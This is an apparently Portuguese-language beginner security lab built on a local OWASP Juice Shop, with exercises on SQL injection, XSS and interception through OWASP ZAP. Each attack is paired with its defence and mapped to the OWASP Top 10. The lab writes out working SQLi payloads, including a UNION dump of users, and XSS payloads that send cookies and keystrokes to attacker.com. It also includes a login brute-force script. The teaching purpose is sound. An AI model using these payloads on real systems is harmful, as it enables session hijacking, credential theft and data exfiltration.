@@ -1,0 +1,1109 @@
+# Laboratório Prático: Fundamentos e Mindset de Ataque
+## Módulo 1 - Explorando para Entender a Defesa
+
+---
+
+## 🎯 OBJETIVOS DO LABORATÓRIO
+
+Ao final deste laboratório, você será capaz de:
+
+1. ✅ Compreender o mindset de um atacante
+2. ✅ Identificar e explorar SQL Injection em ambiente controlado
+3. ✅ Demonstrar impacto real de Cross-Site Scripting (XSS)
+4. ✅ Interceptar e manipular requisições HTTP com OWASP ZAP
+5. ✅ Entender OWASP Top 10 através de exploração prática
+6. ✅ Relacionar vulnerabilidades com controles defensivos
+7. ✅ Desenvolver mentalidade "Security by Design"
+
+**Duração:** 30 minutos  
+**Nível:** Iniciante  
+**Pré-requisitos:** Conhecimento básico de HTTP, navegador web
+
+---
+
+## 📚 PARTE 1: CONFIGURAÇÃO DO AMBIENTE (5 minutos)
+
+### 🛠️ Aplicação Vulnerável - OWASP Juice Shop
+
+```bash
+# Opção 1: Docker (Recomendado)
+docker pull bkimminich/juice-shop
+docker run -d -p 3000:3000 bkimminich/juice-shop
+
+# Aguardar ~30 segundos para inicializar
+sleep 30
+
+# Verificar se está rodando
+curl -s http://localhost:3000 | grep -i "juice"
+
+# Acessar no navegador
+echo "✅ Juice Shop disponível em: http://localhost:3000"
+```
+
+```bash
+# Opção 2: Node.js (se não tiver Docker)
+git clone https://github.com/juice-shop/juice-shop.git
+cd juice-shop
+npm install
+npm start
+
+# Aguardar inicialização
+# Acessar: http://localhost:3000
+```
+
+---
+
+### 🔧 OWASP ZAP (Proxy de Ataque)
+
+```bash
+# Opção 1: Docker (Recomendado para este lab)
+docker pull ghcr.io/zaproxy/zaproxy:stable
+
+# Criar alias para facilitar
+alias zap='docker run -u zap -p 8080:8080 -p 8090:8090 -i ghcr.io/zaproxy/zaproxy:stable'
+
+# Verificar instalação
+docker run --rm ghcr.io/zaproxy/zaproxy:stable zap.sh -version
+
+echo "✅ OWASP ZAP instalado!"
+```
+
+```bash
+# Opção 2: Desktop (para visualização gráfica)
+# Download de: https://www.zaproxy.org/download/
+
+# Linux
+wget https://github.com/zaproxy/zaproxy/releases/download/v2.14.0/ZAP_2.14.0_Linux.tar.gz
+tar -xvf ZAP_2.14.0_Linux.tar.gz
+cd ZAP_2.14.0
+./zap.sh
+
+# macOS
+brew install --cask owasp-zap
+
+# Windows
+# Baixar instalador .exe e executar
+```
+
+---
+
+### 📋 Material de Referência
+
+```bash
+# Criar diretório de trabalho
+mkdir attack-mindset-lab
+cd attack-mindset-lab
+
+# Criar guia OWASP Top 10
+cat > OWASP_Top10_2021.md << 'EOF'
+# OWASP Top 10 (2021) - Guia Rápido
+
+## A01:2021 – Broken Access Control
+**O que é:** Falha em restringir o que usuários autenticados podem fazer
+**Exemplo:** Acessar conta de outro usuário mudando ID na URL
+**Impacto:** Acesso não autorizado a dados ou funcionalidades
+
+## A02:2021 – Cryptographic Failures
+**O que é:** Falhas relacionadas a criptografia (ou falta dela)
+**Exemplo:** Senhas armazenadas em texto claro, dados sensíveis sem criptografia
+**Impacto:** Exposição de dados confidenciais
+
+## A03:2021 – Injection
+**O que é:** Dados não confiáveis enviados para interpretador como comando
+**Exemplo:** SQL Injection, Command Injection, LDAP Injection
+**Impacto:** Perda de dados, bypass de autenticação, execução remota de código
+
+## A04:2021 – Insecure Design
+**O que é:** Falhas no design e arquitetura da aplicação
+**Exemplo:** Falta de rate limiting, ausência de validação de regras de negócio
+**Impacto:** Variado, desde fraudes até comprometimento total
+
+## A05:2021 – Security Misconfiguration
+**O que é:** Configurações inseguras ou default
+**Exemplo:** Mensagens de erro detalhadas, portas desnecessárias abertas
+**Impacto:** Exposição de informações, acesso não autorizado
+
+## A06:2021 – Vulnerable and Outdated Components
+**O que é:** Uso de bibliotecas/frameworks com vulnerabilidades conhecidas
+**Exemplo:** Log4Shell (CVE-2021-44228)
+**Impacto:** Execução remota de código, comprometimento do servidor
+
+## A07:2021 – Identification and Authentication Failures
+**O que é:** Falhas na verificação de identidade do usuário
+**Exemplo:** Permitir senhas fracas, session fixation
+**Impacto:** Comprometimento de contas
+
+## A08:2021 – Software and Data Integrity Failures
+**O que é:** Falhas em verificar integridade de código/dados
+**Exemplo:** Desserialização insegura, CI/CD sem verificação
+**Impacto:** Execução de código malicioso
+
+## A09:2021 – Security Logging and Monitoring Failures
+**O que é:** Falta de logging/monitoramento adequado
+**Exemplo:** Eventos não logados, logs não protegidos
+**Impacto:** Ataques não detectados, impossibilidade de forensics
+
+## A10:2021 – Server-Side Request Forgery (SSRF)
+**O que é:** Aplicação faz requisição para recurso não confiável
+**Exemplo:** App busca URL fornecida pelo usuário sem validação
+**Impacto:** Acesso a sistemas internos, vazamento de dados
+
+---
+
+## Mindset de Ataque vs Defesa
+
+### Mindset de Ataque (Red Team)
+- Pensar como adversário
+- Buscar o caminho de menor resistência
+- Explorar edge cases e comportamentos inesperados
+- Combinar pequenas falhas para impacto maior
+- Persistência: testar todas as possibilidades
+
+### Mindset de Defesa (Blue Team)
+- Defesa em profundidade (múltiplas camadas)
+- Princípio do menor privilégio
+- Validar tudo que vem do usuário
+- Fail secure (falhar de forma segura)
+- Monitorar e detectar anomalias
+
+### Purple Team (O Ideal)
+- Entender ataque PARA construir defesa melhor
+- Testar defensas com técnicas de ataque reais
+- Feedback loop: ataque → defesa → melhoria
+EOF
+
+cat OWASP_Top10_2021.md
+```
+
+---
+
+## 🎯 PARTE 2: SQL INJECTION - EXPLORANDO (10 minutos)
+
+### 📝 EXERCÍCIO 2.1: Entender SQL Injection
+
+**O que é SQL Injection?**
+
+```sql
+-- Código vulnerável (exemplo conceitual)
+query = "SELECT * FROM users WHERE username='" + input_username + "' AND password='" + input_password + "'"
+
+-- Input normal:
+username = "admin"
+password = "123456"
+-- Query resultante: SELECT * FROM users WHERE username='admin' AND password='123456'
+
+-- Input malicioso:
+username = "admin'--"
+password = "qualquer coisa"
+-- Query resultante: SELECT * FROM users WHERE username='admin'--' AND password='qualquer coisa'
+--                   O '--' comenta o resto, ignorando a senha!
+```
+
+---
+
+### 📝 EXERCÍCIO 2.2: SQL Injection no Juice Shop
+
+**Passo 1: Login Bypass (Admin sem senha)**
+
+```bash
+# Abrir Juice Shop
+# URL: http://localhost:3000
+
+# Clicar em "Account" → "Login"
+```
+
+**Tentativa 1: Login normal (vai falhar)**
+```
+Email: admin@juice-sh.op
+Password: 123456
+[Login]
+
+Resultado: ❌ Invalid email or password.
+```
+
+**Tentativa 2: SQL Injection básico**
+```
+Email: admin@juice-sh.op'--
+Password: [qualquer coisa]
+[Login]
+
+Resultado: ❌ Pode não funcionar (Juice Shop usa prepared statements em login)
+```
+
+**Tentativa 3: SQL Injection na busca de produtos**
+```bash
+# Navegar para a página principal
+# URL: http://localhost:3000
+
+# Na barra de busca no topo, inserir:
+apple'))--
+
+# OU usar URL direta:
+curl "http://localhost:3000/rest/products/search?q=apple'))--"
+```
+
+**Análise do Payload:**
+```sql
+-- Query original (vulnerável):
+SELECT * FROM products WHERE name LIKE '%apple%'
+
+-- Com payload apple'))--:
+SELECT * FROM products WHERE name LIKE '%apple'))--
+
+-- Explicação:
+-- '))  fecha a string e parênteses
+-- --   comenta o resto da query
+-- Resultado: Erro SQL ou comportamento estranho
+```
+
+---
+
+### 📝 EXERCÍCIO 2.3: SQL Injection para Exfiltrar Dados
+
+**SQLi UNION-based (mais avançado)**
+
+```bash
+# Injetar UNION para buscar dados de outras tabelas
+
+# Payload 1: Descobrir número de colunas
+http://localhost:3000/rest/products/search?q=apple')) UNION SELECT NULL--
+http://localhost:3000/rest/products/search?q=apple')) UNION SELECT NULL,NULL--
+http://localhost:3000/rest/products/search?q=apple')) UNION SELECT NULL,NULL,NULL--
+
+# Continue até não dar erro, descobrindo o número de colunas
+```
+
+**Payload 2: Exfiltrar dados de usuários (conceitual)**
+```sql
+-- Se descobrir que há 9 colunas, pode tentar:
+apple')) UNION SELECT id, email, password, null, null, null, null, null, null FROM users--
+
+-- Isso retornaria emails e senhas (hashadas) de todos os usuários!
+```
+
+---
+
+### 📊 TAREFA 1: Documentar Impacto de SQL Injection
+
+| Aspecto | Descrição | Severidade |
+|---------|-----------|------------|
+| **Confidencialidade** | Acesso a TODOS os dados do banco (usuários, pedidos, cartões) | ⚠️ CRÍTICA |
+| **Integridade** | Modificar/deletar dados (`UPDATE users SET...`, `DROP TABLE...`) | ⚠️ CRÍTICA |
+| **Disponibilidade** | Derrubar banco de dados (`DROP DATABASE...`) | ⚠️ ALTA |
+| **Autenticação** | Bypass de login (entrar como admin sem senha) | ⚠️ CRÍTICA |
+| **Autorização** | Elevar privilégios (tornar-se admin) | ⚠️ CRÍTICA |
+
+**Pergunta de Reflexão:**
+- Se você fosse defender contra SQL Injection, quais controles implementaria?
+  - [ ] Prepared Statements / Parameterized Queries
+  - [ ] Input Validation (whitelist)
+  - [ ] Least Privilege (DB user com permissões mínimas)
+  - [ ] WAF (Web Application Firewall)
+  - [ ] Todos os acima ✅
+
+---
+
+## 💉 PARTE 3: CROSS-SITE SCRIPTING (XSS) (8 minutos)
+
+### 📝 EXERCÍCIO 3.1: Entender XSS
+
+**O que é XSS?**
+
+```html
+<!-- Código vulnerável (exemplo) -->
+<h1>Resultados para: <?php echo $_GET['search']; ?></h1>
+
+<!-- Input normal: -->
+?search=laptop
+<!-- Output: -->
+<h1>Resultados para: laptop</h1>
+
+<!-- Input malicioso: -->
+?search=<script>alert('XSS')</script>
+<!-- Output: -->
+<h1>Resultados para: <script>alert('XSS')</script></h1>
+<!-- O JavaScript é EXECUTADO no navegador da vítima! -->
+```
+
+---
+
+### 📝 EXERCÍCIO 3.2: XSS Refletido no Juice Shop
+
+**Passo 1: Identificar campo de busca vulnerável**
+
+```bash
+# Juice Shop tem proteção contra XSS em alguns campos
+# Vamos encontrar onde está vulnerável
+
+# Testar na busca de produtos
+http://localhost:3000/#/search?q=<script>alert('XSS')</script>
+
+# Se não funcionar, tentar na seção "Track Orders"
+# Ou em campos de comentários
+```
+
+**Passo 2: Payload XSS básico**
+
+```html
+<!-- Payload 1: Alert simples -->
+<script>alert('XSS')</script>
+
+<!-- Payload 2: Roubar cookies (DOM-based) -->
+<script>alert(document.cookie)</script>
+
+<!-- Payload 3: Redirecionar para site malicioso -->
+<script>window.location='http://attacker.com/steal?cookie='+document.cookie</script>
+
+<!-- Payload 4: Iframe invisível (para enviar dados) -->
+<iframe src="http://attacker.com/steal" style="display:none"></iframe>
+```
+
+**Passo 3: XSS em DOM (mais difícil de detectar)**
+
+```html
+<!-- Se campo de busca usa innerHTML ou document.write -->
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+```
+
+---
+
+### 📝 EXERCÍCIO 3.3: Demonstrar Impacto de XSS
+
+**Cenário 1: Roubo de Sessão**
+
+```javascript
+// Atacante injeta este código:
+<script>
+  // Roubar cookie de sessão
+  var stolen = document.cookie;
+  
+  // Enviar para servidor do atacante
+  fetch('http://attacker.com/steal?cookie=' + stolen);
+  
+  // OU criar requisição falsa
+  new Image().src = 'http://attacker.com/steal?c=' + stolen;
+</script>
+
+// Com o cookie, atacante pode:
+// 1. Fazer login como a vítima (session hijacking)
+// 2. Acessar dados privados
+// 3. Realizar ações em nome da vítima
+```
+
+**Cenário 2: Keylogger via XSS**
+
+```javascript
+<script>
+  document.onkeypress = function(e) {
+    fetch('http://attacker.com/log?key=' + e.key);
+  }
+</script>
+
+// Captura TODAS as teclas digitadas pela vítima!
+// Incluindo senhas, dados de cartão, etc.
+```
+
+**Cenário 3: Defacement (modificar página)**
+
+```javascript
+<script>
+  document.body.innerHTML = '<h1>Site Hackeado!</h1>';
+</script>
+```
+
+---
+
+### 📊 TAREFA 2: Documentar Impacto de XSS
+
+| Tipo de XSS | Onde Ocorre | Persistência | Impacto |
+|-------------|-------------|--------------|---------|
+| **Reflected** | URL, erro 404 | Não (apenas em clique no link) | Roubo de sessão, phishing |
+| **Stored** | Banco de dados | Sim (afeta todos que visualizam) | Worm XSS, comprometimento em massa |
+| **DOM-based** | JavaScript client-side | Não | Bypass de CSP, roubo de dados |
+
+**Pergunta de Reflexão:**
+- Como defender contra XSS?
+  - [ ] Output Encoding/Escaping
+  - [ ] Content Security Policy (CSP)
+  - [ ] HTTPOnly cookies (não acessíveis via JS)
+  - [ ] Input Sanitization
+  - [ ] Todos os acima ✅
+
+---
+
+## 🕵️ PARTE 4: INTERCEPTAÇÃO COM OWASP ZAP (7 minutos)
+
+### 📝 EXERCÍCIO 4.1: Configurar Proxy ZAP
+
+**Passo 1: Iniciar ZAP em modo proxy**
+
+```bash
+# Se usando Docker
+docker run -u zap -p 8080:8080 -i ghcr.io/zaproxy/zaproxy:stable zap.sh -daemon -host 0.0.0.0 -port 8080 -config api.addrs.addr.name=.* -config api.addrs.addr.regex=true -config api.disablekey=true
+
+# Se usando Desktop
+# Abrir ZAP Desktop
+# Automated Scan → Manual Explore → Configurar browser
+```
+
+**Passo 2: Configurar navegador para usar proxy**
+
+```
+Firefox:
+1. Settings → Network Settings
+2. Manual proxy configuration
+3. HTTP Proxy: localhost, Port: 8080
+4. ✅ Use this proxy server for all protocols
+5. OK
+
+Chrome (via extensão):
+1. Instalar "Proxy SwitchyOmega"
+2. Criar profile: localhost:8080
+3. Ativar profile
+```
+
+**Passo 3: Instalar certificado ZAP (para HTTPS)**
+
+```bash
+# Gerar certificado
+curl http://localhost:8080/OTHER/core/other/rootcert/ -o zap-cert.crt
+
+# Importar no navegador
+# Firefox: Settings → Privacy & Security → Certificates → View Certificates → Import
+# Marcar: Trust this CA to identify websites
+```
+
+---
+
+### 📝 EXERCÍCIO 4.2: Interceptar e Modificar Requisições
+
+**Passo 1: Ativar interceptação no ZAP**
+
+```
+ZAP Interface:
+1. Clicar no ícone "Break" (pausar requisições)
+2. Navegar para Juice Shop: http://localhost:3000
+3. ZAP captura a requisição HTTP
+```
+
+**Passo 2: Visualizar requisição HTTP**
+
+```http
+GET / HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+```
+
+**Passo 3: Modificar requisição**
+
+```http
+# Exemplo: Modificar User-Agent
+User-Agent: Hacker/1.0 (Penetration Testing)
+
+# Exemplo: Adicionar header customizado
+X-Custom-Header: Testing
+
+# Exemplo: Modificar parâmetro GET
+# Original: /rest/products/search?q=apple
+# Modificar para: /rest/products/search?q=apple' OR 1=1--
+```
+
+**Passo 4: Enviar requisição modificada**
+
+```
+ZAP Interface:
+1. Editar requisição
+2. Clicar "Submit and continue to next break point"
+3. Observar resposta do servidor
+```
+
+---
+
+### 📝 EXERCÍCIO 4.3: Fuzzing com ZAP
+
+**Fuzzing automático de parâmetros:**
+
+```bash
+# Via ZAP API (Docker)
+# Fuzz do parâmetro de busca
+curl "http://localhost:8080/JSON/ascan/action/scan/?url=http://host.docker.internal:3000&recurse=true"
+
+# Checar progresso
+curl "http://localhost:8080/JSON/ascan/view/status"
+
+# Ver alertas encontrados
+curl "http://localhost:8080/JSON/core/view/alerts" | jq '.'
+```
+
+**No ZAP Desktop:**
+
+```
+1. Navegar pelo Juice Shop normalmente
+2. No ZAP: Sites → http://localhost:3000
+3. Botão direito → Attack → Active Scan
+4. Aguardar scan completar (~5 minutos)
+5. Ver "Alerts" tab → Vulnerabilidades encontradas automaticamente!
+```
+
+---
+
+### 📊 TAREFA 3: Análise de Tráfego HTTP
+
+Preencha observações sobre requisições interceptadas:
+
+| Requisição | Método | Parâmetros | Headers Interessantes | Possível Vulnerabilidade |
+|------------|--------|------------|----------------------|--------------------------|
+| Login | POST | email, password | Cookie: token=... | Senha em texto claro? |
+| Busca | GET | q=[search] | User-Agent | SQL Injection em 'q' |
+| API Products | GET | id=[number] | Authorization | IDOR (mudar ID) |
+| Checkout | POST | productId, quantity | CSRF token? | CSRF se sem token |
+
+**Pergunta de Reflexão:**
+- O que você aprendeu interceptando tráfego?
+  - Dados sensíveis em URLs?
+  - Autenticação/tokens expostos?
+  - Parâmetros manipuláveis?
+  - Headers de segurança ausentes?
+
+---
+
+## 🎓 PARTE 5: OWASP TOP 10 - CONEXÕES (5 minutos)
+
+### 📝 EXERCÍCIO 5.1: Mapear Vulnerabilidades Exploradas
+
+```bash
+cat > vulnerabilities_mapped.md << 'EOF'
+# Mapeamento: Explorações → OWASP Top 10
+
+## Explorações Realizadas no Lab
+
+### 1. SQL Injection (Busca de Produtos)
+**Mapeia para:** A03:2021 – Injection
+**Técnica:** Injetar SQL via parâmetro de busca
+**Impacto:** Acesso a dados do banco, bypass de autenticação
+**Defesa:**
+- ✅ Prepared Statements (parameterized queries)
+- ✅ Input validation (whitelist)
+- ✅ Least privilege (DB permissions)
+- ✅ WAF rules
+
+### 2. Cross-Site Scripting (XSS)
+**Mapeia para:** A03:2021 – Injection (JavaScript injection)
+**Técnica:** Injetar JavaScript malicioso
+**Impacto:** Roubo de sessão, keylogging, defacement
+**Defesa:**
+- ✅ Output encoding/escaping
+- ✅ Content Security Policy (CSP)
+- ✅ HTTPOnly cookies
+- ✅ Input sanitization
+
+### 3. Interceptação de Tráfego (ZAP)
+**Mapeia para:** A02:2021 – Cryptographic Failures
+**Técnica:** Man-in-the-Middle (se sem HTTPS)
+**Impacto:** Exposição de credenciais, dados sensíveis
+**Defesa:**
+- ✅ HTTPS (TLS 1.3)
+- ✅ HSTS (HTTP Strict Transport Security)
+- ✅ Certificate pinning
+- ✅ Secure cookies (Secure flag)
+
+### 4. Manipulação de Parâmetros (IDOR potencial)
+**Mapeia para:** A01:2021 – Broken Access Control
+**Técnica:** Modificar IDs em URLs/requests
+**Impacto:** Acesso a dados de outros usuários
+**Defesa:**
+- ✅ Authorization checks (server-side)
+- ✅ Indirect object references
+- ✅ Session-based access control
+- ✅ Logging de tentativas de acesso
+
+### 5. Falta de Rate Limiting (observado no ZAP)
+**Mapeia para:** A04:2021 – Insecure Design
+**Técnica:** Flood de requisições
+**Impacto:** Brute force, DoS, resource exhaustion
+**Defesa:**
+- ✅ Rate limiting (por IP, por usuário)
+- ✅ CAPTCHA em endpoints sensíveis
+- ✅ Account lockout
+- ✅ Throttling
+
+---
+
+## Vulnerabilidades NÃO Exploradas (mas presentes no Juice Shop)
+
+### A06:2021 – Vulnerable Components
+**Exemplo no Juice Shop:** Versões antigas de Express.js, sanitize-html
+**Como verificar:** npm audit, OWASP Dependency Check
+**Defesa:** Manter dependências atualizadas
+
+### A07:2021 – Authentication Failures
+**Exemplo:** Senhas fracas permitidas, falta de MFA
+**Como testar:** Tentar registrar usuário com senha "123"
+**Defesa:** Password policy, MFA, account lockout
+
+### A09:2021 – Logging Failures
+**Exemplo:** Ações não logadas, logs acessíveis
+**Como testar:** Fazer ações sensíveis e verificar se foram registradas
+**Defesa:** Centralizar logs, audit trail, SIEM
+
+---
+
+## Mindset Desenvolvido
+
+### Red Team (Ataque)
+✅ Pensar em edge cases
+✅ Testar entradas maliciosas
+✅ Combinar múltiplas falhas
+✅ Explorar confiança excessiva
+✅ Persistir em encontrar falhas
+
+### Blue Team (Defesa)
+✅ Validar TUDO que vem do usuário
+✅ Defesa em profundidade (camadas)
+✅ Fail secure (falhar de forma segura)
+✅ Princípio do menor privilégio
+✅ Monitorar e detectar anomalias
+
+### Purple Team (Síntese)
+✅ Entender ataque → Construir defesa melhor
+✅ Testar defesas com ataques reais
+✅ Ciclo contínuo de melhoria
+EOF
+
+cat vulnerabilities_mapped.md
+```
+
+---
+
+### 📊 TAREFA 4: OWASP Top 10 Checklist
+
+Marque as vulnerabilidades que você explorou ou observou:
+
+- [x] **A01 - Broken Access Control**
+  - Observado: IDOR potencial (mudando IDs)
+  
+- [x] **A02 - Cryptographic Failures**
+  - Observado: Tráfego HTTP interceptável
+
+- [x] **A03 - Injection**
+  - Explorado: SQL Injection ✅
+  - Explorado: XSS ✅
+
+- [x] **A04 - Insecure Design**
+  - Observado: Falta de rate limiting
+
+- [ ] **A05 - Security Misconfiguration**
+  - Não testado neste lab
+
+- [ ] **A06 - Vulnerable Components**
+  - Não testado (mas presente)
+
+- [x] **A07 - Authentication Failures**
+  - Observado: Login bypass tentado
+
+- [ ] **A08 - Software Integrity Failures**
+  - Não testado
+
+- [ ] **A09 - Logging Failures**
+  - Não testado (requer acesso backend)
+
+- [ ] **A10 - SSRF**
+  - Não testado
+
+---
+
+## 📋 ENTREGÁVEIS DO LABORATÓRIO
+
+### 1. Relatório de Exploração
+
+```markdown
+# Relatório - Fundamentos e Mindset de Ataque
+
+**Aluno:** [Nome]
+**Data:** [Data]
+**Aplicação Testada:** OWASP Juice Shop
+
+---
+
+## 1. Vulnerabilidades Exploradas
+
+### SQL Injection
+
+**Localização:** /rest/products/search?q=
+**Payload utilizado:** `apple'))--`
+**Resultado:** [Descrever o que aconteceu]
+**Impacto potencial:** [Listar impactos]
+**Classificação OWASP:** A03:2021 - Injection
+**Severidade:** CRÍTICA
+
+**Screenshots:**
+[Incluir screenshot da exploração]
+
+**Como corrigir:**
+```python
+# ERRADO (Vulnerável)
+query = f"SELECT * FROM products WHERE name LIKE '%{user_input}%'"
+
+# CORRETO (Seguro)
+query = "SELECT * FROM products WHERE name LIKE ?"
+cursor.execute(query, (f"%{user_input}%",))
+```
+
+---
+
+### Cross-Site Scripting (XSS)
+
+**Localização:** [Campo onde XSS funcionou]
+**Payload utilizado:** `<script>alert('XSS')</script>`
+**Resultado:** [Descrever]
+**Impacto potencial:** Roubo de sessão, keylogging, redirecionamento
+**Classificação OWASP:** A03:2021 - Injection
+**Severidade:** ALTA
+
+**Como corrigir:**
+```javascript
+// ERRADO
+document.getElementById('output').innerHTML = userInput;
+
+// CORRETO
+document.getElementById('output').textContent = userInput;
+// OU usar biblioteca de sanitização
+```
+
+---
+
+## 2. Interceptação com OWASP ZAP
+
+### Requisições Interceptadas
+
+| Endpoint | Método | Dados Sensíveis | Vulnerabilidade Potencial |
+|----------|--------|-----------------|---------------------------|
+| /rest/user/login | POST | email, password | Credenciais expostas |
+| /api/Products | GET | - | IDOR potencial |
+| /rest/basket/[id] | GET | items, prices | Manipulação de preços |
+
+### Headers de Segurança Ausentes
+
+- [ ] Strict-Transport-Security (HSTS)
+- [ ] Content-Security-Policy (CSP)
+- [ ] X-Frame-Options
+- [ ] X-Content-Type-Options
+
+---
+
+## 3. Mapeamento OWASP Top 10
+
+[Preencher checklist da Tarefa 4]
+
+---
+
+## 4. Lições Aprendidas
+
+### Mindset de Ataque
+1. [Insight 1: ex: "Sempre testar edge cases"]
+2. [Insight 2: ex: "Nunca confiar em validação client-side"]
+3. [Insight 3: ex: "Combinar pequenas falhas pode ter grande impacto"]
+
+### Defesas Necessárias
+1. [Defesa 1: ex: "Input validation em TODOS os campos"]
+2. [Defesa 2: ex: "Output encoding para prevenir XSS"]
+3. [Defesa 3: ex: "Prepared statements para SQL"]
+
+---
+
+## 5. Próximos Passos
+
+- [ ] Explorar outras vulnerabilidades do Juice Shop
+- [ ] Praticar com OWASP WebGoat
+- [ ] Aprender a usar Burp Suite
+- [ ] Estudar OWASP Testing Guide
+```
+
+---
+
+### 2. Capturas de Tela Obrigatórias
+
+- ✅ SQL Injection bem-sucedida (com payload visível)
+- ✅ XSS alert() sendo executado
+- ✅ ZAP interceptando requisição HTTP
+- ✅ Lista de vulnerabilidades encontradas pelo ZAP
+- ✅ Requisição modificada manualmente no ZAP
+
+---
+
+### 3. Código de Exploração
+
+Documentar payloads utilizados:
+
+```bash
+# SQL Injection Payloads
+apple'))--
+' OR 1=1--
+admin'--
+' UNION SELECT NULL--
+
+# XSS Payloads
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert(document.cookie)>
+
+# Comandos ZAP
+curl "http://localhost:8080/JSON/ascan/action/scan/?url=http://localhost:3000"
+```
+
+---
+
+## 🎯 CHECKLIST DE VERIFICAÇÃO
+
+### Ambiente ✅
+- [ ] Juice Shop rodando em http://localhost:3000
+- [ ] OWASP ZAP instalado e configurado
+- [ ] Proxy configurado no navegador
+- [ ] Certificado ZAP instalado (para HTTPS)
+
+### SQL Injection ✅
+- [ ] Entendi o conceito de SQL Injection
+- [ ] Explorei SQL Injection no campo de busca
+- [ ] Documentei pelo menos 2 payloads diferentes
+- [ ] Entendi o impacto (confidencialidade, integridade, autenticação)
+- [ ] Sei como corrigir (prepared statements)
+
+### XSS ✅
+- [ ] Entendi os 3 tipos de XSS (Reflected, Stored, DOM)
+- [ ] Executei payload XSS com sucesso
+- [ ] Vi alert() aparecer no navegador
+- [ ] Entendi o impacto (roubo de sessão, keylogger)
+- [ ] Sei como corrigir (output encoding, CSP)
+
+### OWASP ZAP ✅
+- [ ] Configurei ZAP como proxy
+- [ ] Interceptei pelo menos 3 requisições HTTP
+- [ ] Modifiquei uma requisição manualmente
+- [ ] Executei scan automatizado
+- [ ] Analisei vulnerabilidades encontradas
+
+### Mindset ✅
+- [ ] Pensei como atacante durante exploração
+- [ ] Identifiquei pelo menos 3 vetores de ataque
+- [ ] Relacionei vulnerabilidades com OWASP Top 10
+- [ ] Documentei defesas para cada vulnerabilidade
+- [ ] Entendi o valor de "pensar em segurança desde o design"
+
+---
+
+## 📚 RECURSOS ADICIONAIS
+
+### Plataformas de Prática
+- **OWASP Juice Shop:** https://owasp.org/www-project-juice-shop/
+- **OWASP WebGoat:** https://owasp.org/www-project-webgoat/
+- **DVWA:** http://www.dvwa.co.uk/
+- **HackTheBox:** https://www.hackthebox.com/
+- **TryHackMe:** https://tryhackme.com/
+- **PortSwigger Academy:** https://portswigger.net/web-security
+
+### Ferramentas
+- **OWASP ZAP:** https://www.zaproxy.org/
+- **Burp Suite Community:** https://portswigger.net/burp/communitydownload
+- **sqlmap:** http://sqlmap.org/ (SQL injection automation)
+- **XSStrike:** https://github.com/s0md3v/XSStrike
+
+### Documentação
+- **OWASP Top 10:** https://owasp.org/Top10/
+- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/
+- **OWASP Cheat Sheets:** https://cheatsheetseries.owasp.org/
+- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings
+
+### Vídeos e Cursos
+- **OWASP DevSlop:** https://www.youtube.com/c/DevSlopOWASP
+- **The Cyber Mentor:** https://www.youtube.com/c/TheCyberMentor
+- **John Hammond:** https://www.youtube.com/c/JohnHammond010
+- **IppSec:** https://www.youtube.com/c/ippsec
+
+---
+
+## 💡 DICAS E TROUBLESHOOTING
+
+### Problemas Comuns
+
+**Juice Shop não inicia:**
+```bash
+# Verificar se porta 3000 está livre
+netstat -tuln | grep 3000
+
+# Se estiver em uso, matar processo
+lsof -ti:3000 | xargs kill -9
+
+# Ou usar porta diferente
+docker run -p 4000:3000 bkimminich/juice-shop
+```
+
+**ZAP não intercepta tráfego:**
+```bash
+# Verificar se proxy está configurado
+# Firefox: about:preferences → Network Settings
+
+# Verificar se ZAP está rodando
+curl http://localhost:8080
+
+# Desabilitar temporariamente outros proxies/VPNs
+```
+
+**Certificado ZAP não funciona:**
+```bash
+# Baixar certificado novamente
+curl http://localhost:8080/OTHER/core/other/rootcert/ -o zap.crt
+
+# Firefox: 
+# Settings → Privacy & Security → Certificates → View Certificates
+# Authorities → Import → zap.crt
+# ✅ Trust this CA to identify websites
+```
+
+**SQL Injection não funciona:**
+```
+Lembrar:
+- Juice Shop TEM proteção em alguns endpoints
+- Busca de produtos É vulnerável
+- Login NÃO é vulnerável (usa prepared statements)
+- Tentar diferentes payloads
+- Observar respostas de erro (podem dar dicas)
+```
+
+**XSS não executa:**
+```html
+<!-- Tentar diferentes encodings -->
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<iframe src=javascript:alert(1)>
+
+<!-- Verificar se CSP está bloqueando -->
+<!-- Ver console do navegador (F12) -->
+```
+
+---
+
+## 🏆 DESAFIOS EXTRAS
+
+### Desafio 1: Juice Shop Challenges
+Complete pelo menos 5 desafios do scoreboard:
+- [ ] Score Board (encontrar o scoreboard escondido)
+- [ ] Admin Section (acessar área administrativa)
+- [ ] Five-Star Feedback (dar feedback 5 estrelas sem comprar)
+- [ ] Login Admin (fazer login como admin)
+- [ ] DOM XSS (encontrar e explorar DOM-based XSS)
+
+Acessar scoreboard: http://localhost:3000/#/score-board
+
+---
+
+### Desafio 2: Exploração Completa
+Documente TODAS as vulnerabilidades OWASP Top 10 no Juice Shop:
+- Encontre pelo menos 1 exemplo de cada categoria
+- Documente payload/técnica
+- Prove com screenshot
+- Explique como corrigir
+
+---
+
+### Desafio 3: Criar Exploit Script
+Automatize uma exploração usando Python:
+
+```python
+import requests
+
+# Exemplo: Brute force de login (se não tiver rate limiting)
+url = "http://localhost:3000/rest/user/login"
+
+passwords = ["123456", "password", "admin123", "letmein"]
+
+for pwd in passwords:
+    data = {"email": "admin@juice-sh.op", "password": pwd}
+    r = requests.post(url, json=data)
+    
+    if "authentication" in r.text.lower():
+        print(f"[+] Password found: {pwd}")
+        break
+    else:
+        print(f"[-] Failed: {pwd}")
+```
+
+---
+
+### Desafio 4: Report Profissional
+Crie relatório de pentest profissional:
+- Executive Summary
+- Methodology (OWASP Testing Guide)
+- Findings (ordenados por severidade)
+- Technical Details (payloads, screenshots)
+- Recommendations
+- Remediation Timeline
+
+---
+
+## 📊 MÉTRICAS DE SUCESSO
+
+Ao final do laboratório, você deve:
+
+- ✅ Ter explorado pelo menos 2 vulnerabilidades com sucesso
